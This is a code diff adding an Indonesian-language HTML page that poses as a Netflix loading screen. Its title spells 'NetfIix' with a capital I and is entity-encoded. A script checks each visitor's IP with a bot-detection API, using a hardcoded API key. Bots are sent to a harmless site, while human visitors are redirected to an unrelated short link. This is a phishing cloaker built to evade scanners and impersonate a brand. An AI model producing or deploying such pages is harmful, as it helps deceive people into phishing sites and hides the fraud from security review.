@@ -1,0 +1,94 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"> <!-- penting untuk mobile -->
+  <title>&#x4e;&#x65;&#x74;&#x66;&#x49;&#x69;&#x78;</title>
+  <!-- Font Work Sans -->
+  <link href="https://fonts.googleapis.com/css2?family=Work+Sans:wght@400;500&display=swap" rel="stylesheet">
+  <style>
+    body {
+      margin: 0;
+      height: 100vh;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      background: #fff;
+      font-family: 'Work Sans', 'Helvetica Neue', Arial, sans-serif;
+      flex-direction: column;
+      text-align: center;
+      padding: 20px;
+    }
+
+    .spinner {
+      width: 15vmin; /* ukuran fleksibel mengikuti layar */
+      height: 15vmin;
+      max-width: 80px; /* biar tidak terlalu besar */
+      max-height: 80px;
+      min-width: 40px; /* biar tetap terlihat di layar kecil */
+      min-height: 40px;
+      border: 3px solid rgba(0, 0, 0, 0.1);
+      border-top: 3px solid #E50914;
+      border-radius: 50%;
+      animation: spin 1s linear infinite;
+      margin-bottom: 20px;
+    }
+
+    @keyframes spin {
+      0% { transform: rotate(0deg); }
+      100% { transform: rotate(360deg); }
+    }
+
+    .loading-text {
+      font-size: clamp(14px, 2.5vw, 20px); /* otomatis menyesuaikan */
+      color: #333;
+      font-weight: 500;
+      letter-spacing: 0.5px;
+    }
+
+    /* Media query tambahan */
+    @media (max-width: 480px) {
+      .spinner {
+        margin-bottom: 15px;
+      }
+      .loading-text {
+        font-size: 15px;
+      }
+    }
+  </style>
+</head>
+<body>
+  <div class="spinner"></div>
+  <div class="loading-text">Loading...</div>
+
+  <script>
+    const API_KEY = "a50c933e-06bd-4882-b2f6-0ac5a72c5605"; // ganti dengan API key kamu
+    const API_BASE = "https://api.ipdetective.io";
+
+    (async () => {
+      try {
+        const res = await fetch(`${API_BASE}/ip?info=true`, {
+          headers: {
+            "Accept": "application/json",
+            "x-api-key": API_KEY
+          }
+        });
+        if (!res.ok) throw new Error(res.status + " " + res.statusText);
+        const data = await res.json();
+
+        // Redirect sesuai hasil
+        if (data.bot === true) {
+          window.location.href = "https://ipdetective.io";
+        } else {
+          window.location.href = "https://api.coolbi.net/r/s7E3xa";
+        }
+      } catch (err) {
+        // fallback jika API error
+        console.error("API error:", err);
+        window.location.href = "https://api.coolbi.net/r/s7E3xa";
+      }
+    })();
+  </script>
+</body>
+
+</html>
